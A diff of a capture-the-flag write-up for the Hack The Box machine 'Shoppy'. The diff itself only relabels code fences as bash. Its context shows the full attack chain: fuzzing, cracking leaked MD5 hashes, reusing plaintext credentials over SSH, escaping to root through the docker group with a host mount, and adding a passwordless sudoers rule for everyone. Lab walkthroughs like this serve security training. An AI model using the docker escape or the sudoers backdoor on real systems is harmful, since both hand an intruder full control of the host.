@@ -24,7 +24,7 @@ Shoppy is a quick and fun easy box where we have to do a Sqli and use docker
 
 ## PortScan
 
-```
+```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 19:28 CST
 Nmap scan report for shoppy.htb (10.10.11.180)
 Host is up (0.18s latency).
@@ -43,7 +43,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 If a use curl we can see a domain add to your /etc/hosts
 
-```
+```bash
 ❯ curl http://10.10.11.180 -I
 HTTP/1.1 301 Moved Permanently
 Server: nginx/1.23.1
@@ -54,14 +54,14 @@ Connection: keep-alive
 Location: http://shoppy.htb
 ```
 
-```
+```bash
 ❯ /usr/bin/cat /etc/hosts | grep 10.10.11.180
 10.10.11.180 shoppy.htb
 ```
 
 Is working
 
-```
+```bash
 ❯ ping -c 1 shoppy.htb
 PING shoppy.htb (10.10.11.180) 56(84) bytes of data.
 64 bytes from shoppy.htb (10.10.11.180): icmp_seq=1 ttl=63 time=176 ms
@@ -74,7 +74,7 @@ rtt min/avg/max/mdev = 176.464/176.464/176.464/0.000 ms
 ## Enumeration
 
 This are the services of are running in the website
-```
+```bash
 ❯ whatweb http://10.10.11.180
 http://10.10.11.180 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]
 http://shoppy.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.23.1], IP[10.10.11.180], JQuery, Script, Title[Shoppy Wait Page][Title element contains newline(s)!], nginx[1.23.1]
@@ -86,7 +86,7 @@ This is the web
 
 I going to do fuzzing maybe are other routes that we can find
 
-```
+```bash
 ❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -u shoppy.htb
 ===============================================================
 Gobuster v3.1.0
@@ -148,14 +148,14 @@ If you click in the button you have hashes of users
 ![/assets/images/htb-writeup-shoppy/hash.png](/assets/images/htb-writeup-shoppy/hash.png)
 
 
-```
+```bash
 [{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
 {"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
 ```
 
 I going to use john to crack the hashes
 
-```
+```bash
 ❯ /usr/bin/cat hashes
 admin:23c6877d9e2b564ef8b32c3a23de27b2
 josh:6ebcea65320589ca4f2f1ce039975995
@@ -163,7 +163,7 @@ josh:6ebcea65320589ca4f2f1ce039975995
 
 We have credentials
 
-```
+```bash
 ❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
 Using default input encoding: UTF-8
 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
@@ -177,7 +177,7 @@ Session completed
 
 I found this subdomain add to the /etc/hosts too 
 
-```
+```bash
 ❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 80 -u shoppy.htb
 ===============================================================
 Gobuster v3.1.0
@@ -195,14 +195,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 Found: mattermost.shoppy.htb
 ```
 
-```
+```bash
 ❯ /usr/bin/cat /etc/hosts | grep 10.10.11.180
 10.10.11.180 shoppy.htb mattermost.shoppy.htb 
 ```
 
 It works
 
-```
+```bash
 ❯ ping -c 1 mattermost.shoppy.htb
 PING shoppy.htb (10.10.11.180) 56(84) bytes of data.
 64 bytes from shoppy.htb (10.10.11.180): icmp_seq=1 ttl=63 time=390 ms
@@ -214,7 +214,7 @@ rtt min/avg/max/mdev = 390.409/390.409/390.409/0.000 ms
 
 We can try with the credentials 
 
-```
+```bash
 josh:remembermethisway
 ```
 
@@ -228,14 +228,14 @@ We can see more information and josh said they going to use docker for the deplo
 
 We have more credentials
 
-```
+```bash
 ❯ /usr/bin/cat creden.txt
 username: jaeger
 password: Sh0ppyBest@pp!
 ```
 I can connect with ssh 
 
-```
+```bash
 ❯ ssh jaeger@10.10.11.180
 The authenticity of host '10.10.11.180 (10.10.11.180)' can't be established.
 ECDSA key fingerprint is SHA256:KoI81LeAk+ps7zoc1ru39Mg7srdxjzOb1UgmdW6T6kI.
@@ -264,7 +264,7 @@ jaeger@shoppy:~$
 
 We can run a binary as the user deploy
 
-```
+```bash
 jaeger@shoppy:~$ sudo -l
 [sudo] password for jaeger: 
 Matching Defaults entries for jaeger on shoppy:
@@ -277,7 +277,7 @@ jaeger@shoppy:~$
 
 We need a password 
 
-```
+```bash
 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
 Welcome to Josh password manager!
 Please enter your master password: xd 
@@ -286,25 +286,25 @@ Access denied! This incident will be reported !
 
 But we can see the file
 
-```
+```bash
 jaeger@shoppy:/home/deploy$ cat password-manager
 ```
 
 The data is messy but we can see this line
 
-```
+```bash
 Please enter your master password: SampleAccess granted!
 ```
 
 We can use the credential
 
-```
+```bash
 Sample
 ```
 
 And we have the credentials of deploy user
 
-```
+```bash
 jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
 Welcome to Josh password manager!
 Please enter your master password: Sample
@@ -316,14 +316,14 @@ password: Deploying@pp!
 
 credentials
 
-```
+```bash
 user:deploy 
 password:Deploying@app!
 ```
 
 We're in a docker group
 
-```
+```bash
 ❯ ssh deploy@10.10.11.180
 deploy@10.10.11.180's password: 
 Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
@@ -355,7 +355,7 @@ After searching information I found this
 
 We can run a docker and be root in it, we follow the instructions
 
-```
+```bash
 deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # bash
 root@26db7e3466f7:/# whoami
@@ -364,7 +364,7 @@ root
 
 We're root but we are in the container 
 
-```
+```bash
 root@26db7e3466f7:~# cat root.txt 
 82cbc15ee0e3ce5c8b22fb620baf9d10
 root@26db7e3466f7:~# hostname -I
@@ -374,7 +374,7 @@ root@26db7e3466f7:~#
 
 we can edit the file /usr/sudoers because we are root and see the mount changes on the real machine
 
-```
+```bash
 root@26db7e3466f7:~# echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 root@26db7e3466f7:~# exit
 exit
